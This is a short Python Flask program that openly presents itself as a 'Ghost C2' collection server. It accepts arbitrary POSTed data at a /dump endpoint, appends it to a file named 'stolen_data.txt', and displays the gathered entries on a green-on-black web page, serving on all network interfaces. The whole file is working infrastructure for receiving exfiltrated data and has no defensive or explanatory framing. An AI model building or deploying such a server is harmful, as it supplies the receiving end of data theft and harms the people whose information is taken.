import os
from flask import Flask, request, render_template_string

app = Flask(__name__)
LOG_FILE = "stolen_data.txt"

HTML = '''
<!DOCTYPE html>
<html>
<head><title>Ghost C2</title><style>
body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
.log { border: 1px solid #0f0; padding: 10px; margin: 10px 0; background: #050505; }
</style></head>
<body>
<h1>[ GHOST STORAGE ]</h1>
{% for line in lines %}
<div class="log">{{ line }}</div>
{% endfor %}
</body></html>
'''

@app.route('/')
def index():
    lines = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
    return render_template_string(HTML, lines=reversed(lines))

@app.route('/dump', methods=['POST'])
def dump():
    data = request.data.decode('utf-8')
    with open(LOG_FILE, "a") as f:
        f.write(data + "\n")
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)